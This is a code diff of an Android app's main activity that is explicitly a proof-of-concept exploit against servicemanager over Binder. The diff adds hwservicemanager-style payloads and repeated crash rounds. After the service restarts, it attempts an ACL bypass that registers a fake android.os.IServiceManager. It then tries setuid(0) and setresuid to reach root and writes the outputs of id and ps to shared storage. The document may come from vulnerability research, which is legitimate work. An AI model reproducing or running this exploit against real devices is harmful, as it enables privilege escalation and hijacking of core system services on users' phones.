@@ -24,15 +24,9 @@ import androidx.core.content.ContextCompat;
 import com.qualcomm.qti.qms.api.minksocket.IMinkSocketFd;
 
 import java.io.File;
-import java.io.FileDescriptor;
-import java.io.FileInputStream;
 import java.io.FileOutputStream;
-import java.io.InputStream;
-import java.io.OutputStream;
 import java.io.OutputStreamWriter;
 import java.io.PrintWriter;
-import java.nio.ByteBuffer;
-import java.nio.ByteOrder;
 import java.nio.charset.StandardCharsets;
 import java.text.SimpleDateFormat;
 import java.util.ArrayList;
@@ -78,10 +72,12 @@ public class MainActivity extends AppCompatActivity {
     public static native int nativeSendNullBuffer(int fd);
     public static native int nativeSendIntegerOverflowGetService(int fd);
     public static native int nativeAddService(int fd, String name);
+    public static native int nativeGetService(int fd, String name);
     public static native int nativeSetUid(int uid);
     public static native int nativeSetResUid(int uid);
     public static native String nativeExecCommand(String cmd);
     public static native int nativeForkExec(String cmd);
+    public static native String nativeRunHwPayloadsOnServiceManager(int fd);
 
     private ServiceConnection tzConnection = new ServiceConnection() {
         @Override
@@ -191,7 +187,7 @@ public class MainActivity extends AppCompatActivity {
 
     private void executeExploit() {
         appendLog("========================================");
-        appendLog("===== ServiceManager Exploit POC =====");
+        appendLog("===== ServiceManager ACL Bypass POC =====");
 
         appendLog("[*] Gathering kernel info");
         String kernelInfo = nativeGetKernelInfo();
@@ -211,9 +207,13 @@ public class MainActivity extends AppCompatActivity {
         String version = nativeBinderGetVersion(binderFd);
         appendLog("[*] Binder version: " + version);
 
+        appendLog("[*] Sending hwservicemanager-style payloads...");
+        String payloadResult = nativeRunHwPayloadsOnServiceManager(binderFd);
+        appendLog(payloadResult);
+
         boolean crashed = false;
         int attackCount = 0;
-        while (!crashed && attackCount < 4 && !stopRequested.get()) {
+        while (!crashed && attackCount < 5 && !stopRequested.get()) {
             attackCount++;
             appendLog("[*] Attack round " + attackCount);
 
@@ -253,38 +253,38 @@ public class MainActivity extends AppCompatActivity {
         }
 
         if (crashed) {
-            appendLog("[*] Attempting to add service 'exploit_service'");
-            int addRet = nativeAddService(binderFd, "exploit_service");
-            appendLog("  addService returned " + addRet);
+            appendLog("[*] Restart detected. Attempting ACL Bypass ADD_SERVICE...");
+            String serviceName = "android.os.IServiceManager";
+            int addRet = nativeAddService(binderFd, serviceName);
+            appendLog("  ADD_SERVICE(" + serviceName + ") -> " + addRet);
             if (addRet == 0) {
                 appendLog("[+] Service added successfully!");
-                appendLog("[*] Trying setuid(0)");
-                int uidRet = nativeSetUid(0);
-                appendLog("  setuid(0) -> " + uidRet);
-                if (uidRet != 0) {
-                    int resUidRet = nativeSetResUid(0);
-                    appendLog("  setresuid(0,0,0) -> " + resUidRet);
+                appendLog("[*] Verifying with GET_SERVICE...");
+                int getRet = nativeGetService(binderFd, serviceName);
+                appendLog("  GET_SERVICE(" + serviceName + ") -> " + getRet);
+                if (getRet == 0) {
+                    appendLog("[+] Service is now served by our fake implementation!");
+                    appendLog("[*] Attempting setuid(0)");
+                    int uidRet = nativeSetUid(0);
+                    appendLog("  setuid(0) -> " + uidRet);
+                    if (uidRet != 0) {
+                        int resUidRet = nativeSetResUid(0);
+                        appendLog("  setresuid(0,0,0) -> " + resUidRet);
+                    }
+                    String idOut = nativeExecCommand("id");
+                    appendLog("  id output: " + idOut);
+                    nativeForkExec("echo 'ACL Bypass succeeded' > /sdcard/Download/exploit_success.txt");
+                    nativeForkExec("id >> /sdcard/Download/exploit_success.txt");
+                    nativeForkExec("ps -A >> /sdcard/Download/exploit_success.txt");
+                    appendLog("[*] Check /sdcard/Download/exploit_success.txt");
+                } else {
+                    appendLog("[-] GET_SERVICE failed. Service not recognized.");
                 }
-                String idOut = nativeExecCommand("id");
-                appendLog("  id output: " + idOut);
-                nativeForkExec("echo 'Exploit succeeded' > /sdcard/Download/exploit_result.txt");
-                nativeForkExec("id >> /sdcard/Download/exploit_result.txt");
-                nativeForkExec("ps -Z >> /sdcard/Download/exploit_result.txt");
-                appendLog("[*] Check /sdcard/Download/exploit_result.txt");
             } else {
-                appendLog("[-] Failed to add service");
+                appendLog("[-] ADD_SERVICE failed. ACL Bypass did not work.");
             }
         } else {
-            appendLog("[-] servicemanager did not crash, trying fallback exploit");
-            appendLog("[*] Attempting ADD_SERVICE without crash");
-            int addRet = nativeAddService(binderFd, "exploit_fallback");
-            appendLog("  addService returned " + addRet);
-            if (addRet == 0) {
-                appendLog("[+] Service added (fallback)!");
-                nativeSetUid(0);
-                nativeSetResUid(0);
-                nativeForkExec("id > /sdcard/Download/exploit_fallback.txt");
-            }
+            appendLog("[-] servicemanager did not restart. Exploit chain failed.");
         }
 
         closeFd(binderFd);
